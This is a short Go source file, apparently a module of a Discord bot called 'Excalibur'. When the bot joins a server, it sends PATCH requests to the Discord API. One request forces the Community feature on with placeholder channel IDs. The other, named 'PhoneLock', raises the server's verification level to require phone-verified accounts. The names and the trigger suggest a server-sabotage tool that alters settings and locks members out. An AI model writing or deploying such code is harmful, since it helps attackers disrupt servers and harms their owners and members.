package bypass

import (
	"Excalibur/core/requests"
	"encoding/json"
	"os"
	"sync"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func BypassCommunity(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitGroup) {
	features := []string{"COMMUNITY"}
	dataMap := map[string]any{
		"features":                  features,
		"rules_channel_id":          "1",
		"public_updates_channel_id": "1",
	}

	jsonData, _ := json.Marshal(dataMap)

	requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID, "PATCH", jsonData)

}

func PhoneLock(event *discordgo.GuildCreate) {
	godotenv.Load()
	PREFERRED_LOCALE := os.Getenv("PREFERRED_LOCALE")

	dataMap := map[string]any{
		"preferred_locale":   PREFERRED_LOCALE,
		"verification_level": "4",
	}

	jsonData, _ := json.Marshal(dataMap)

	requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID, "PATCH", jsonData)

}
